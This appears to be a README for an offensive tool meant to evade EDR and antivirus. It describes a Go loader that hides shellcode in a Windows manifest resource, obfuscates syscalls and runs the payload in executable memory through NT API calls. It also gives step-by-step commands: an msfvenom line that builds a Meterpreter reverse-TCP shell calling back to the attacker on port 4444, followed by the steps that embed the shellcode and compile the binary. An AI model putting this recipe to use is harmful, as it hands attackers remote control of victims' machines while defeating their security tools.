# Bypass EDR / AV 

## Summary
This code loads shellcode embedded within the applicationâ€™s resources, decodes it, and executes it directly in memory by leveraging Windows API calls. Functions and variables are configured to handle memory structures and permissions, enabling it to create a thread and execute the shellcode.

## Techniques Used

1- Loading and Extracting Resources: It uses FindResourceW and LoadResource functions to locate and load resources embedded within the binary. The function ReturnShellcode() leverages MAKEINTRESOURCE to access a type 24 resource (specific to Windows) and extract the shellcode contained between delimiters (#! and $!).

2- Shellcode Decoding: Once the resource is extracted, the shellcode is decoded from hexadecimal into bytes for execution.

3- Hash Obfuscation: The hash function applies obfuscation by XOR-ing strings with a specific key (0xde, 0xad, 0xbe, 0xef). It then calculates an SHA-1 hash, and the first 16 characters of the result serve as a system call identifier (syscall ID).

4- Memory Allocation and Permission Configuration: The code utilizes Windows API calls to allocate executable memory (with read, write, and execute permissions) for the shellcode (MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE) and The NtAllocateVirtualMemory method reserves a block of memory with executable permissions for storing the shellcode.

5- Writing and Executing Shellcode in Memory: NtWriteVirtualMemory is used to copy the shellcode into the allocated memory region and A new thread is created with NtCreateThreadEx, pointing to the memory block containing the shellcode.

6- Execution Wait: NtWaitForSingleObject is used to wait indefinitely for the shellcode to execute in the new thread.

We will use a technique of exploiting the manifest files using the RSRC tool.
What is a manifest file? --> It is an XML file that provides information. We will take advantage of this file to leave our shellcode.

## Instructions
Create shellcode --> msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=eth0 lport=4444 EnableStageEncoding=true StageEncoder=x64/xor_dynamic EXITFUNC=thread -f hex

Install 2 libraries : go get "golang.org/x/sys/windows" and go get "github.com/ASP4RUX/Hades/pkg/Hades"

Install RSRC --> go install github.com/akavel/rsrc@latest

Modify manifest.txt file using hex-encoded shellcode inside the characters (#!) and ($!).

RSRC --> rsrc -manifest manifiesto.txt

Compile --> go build -ldflags="-H=windowsgui -s -w"
